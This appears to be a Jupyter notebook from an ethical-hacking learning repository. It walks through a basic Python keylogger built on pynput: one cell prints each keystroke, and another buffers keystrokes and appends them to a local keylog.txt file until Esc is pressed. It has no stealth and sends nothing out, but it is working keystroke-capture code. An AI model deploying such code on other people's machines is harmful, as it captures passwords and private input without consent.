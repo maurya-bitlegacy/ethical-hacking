{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Simple printing of the pressed keys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    print(\"{0} pressed\".format(key)) # Will keep on printing the key pressed till eternity unless esc pressed\n",
    "    \n",
    "def on_release(key):\n",
    "    if key==Key.esc:\n",
    "        return False # Breaks the loop is escape key pressed\n",
    "\n",
    "\n",
    "with Listener(on_press=on_press, on_release = on_release) as listener:\n",
    "#These functions will be called when a key is pressed and released respectively\n",
    "    listener.join() # Will continuously keep running this loop until we break out of it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Saving keys to a log file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Saves keys like 'p'u's's'i'n'b'o'o't's'\n",
    "count=0 # Will use it to write after the user hits a certain number of keys (not necessary)\n",
    "keys=[]\n",
    "\n",
    "def on_press(key):\n",
    "    global keys,count\n",
    "    keys.append(key)\n",
    "    count+=1\n",
    "    print(\"{0} pressed\".format(key)) #Printing no longer reqd though as everything is saved to a file\n",
    "    \n",
    "    if count >=10: # Will write after 10 keys are pressed\n",
    "        count=0\n",
    "        write_file(keys)\n",
    "        keys=[]\n",
    "    \n",
    "def write_file(keys):\n",
    "    with open(\"keylog.txt\",\"a\") as f:\n",
    "        for key in keys:\n",
    "            f.write(str(key))\n",
    "            \n",
    "def on_release(key):\n",
    "    if key==Key.esc:\n",
    "        return False # Breaks the loop is escape key pressed\n",
    "\n",
    "\n",
    "with Listener(on_press=on_press, on_release = on_release) as listener:\n",
    "#These functions will be called when a key is pressed and released respectively\n",
    "    listener.join() # Will continuously keep running this loop until we break out of it"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
